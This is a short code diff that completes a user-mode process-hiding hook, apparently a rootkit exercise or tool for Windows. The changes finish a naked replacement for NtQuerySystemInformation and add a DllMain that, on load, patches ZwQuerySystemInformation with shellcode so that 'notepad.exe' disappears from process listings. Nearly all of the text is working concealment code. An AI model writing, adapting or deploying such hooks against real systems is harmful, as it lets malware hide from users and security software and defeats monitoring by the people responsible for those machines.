@@ -147,6 +147,9 @@ void __declspec(naked)NewZWQuerySyscallInformation(int SystemInformationClass, P
         SPI = (SYSTEM_PROCESS_INFORMATION*)t;
 
     }
+    __asm POPAD
+    __asm mov eax, stat
+    __asm ret
 }
 
 
@@ -170,4 +173,19 @@ void HideProcess(char* name)
     memcpy((char*)ZwQuerySystemInformation, shellcode, 10);
     VirtualProtect(ZwQuerySystemInformation, 7, old, &old);
     ZwQuerySystemInformation = (NTSTATUS(__stdcall*)(int, PVOID, ULONG, PULONG))Sys_ZwQSI;
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        HideProcess((char *)"notepad.exe");
+        break;
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
 }
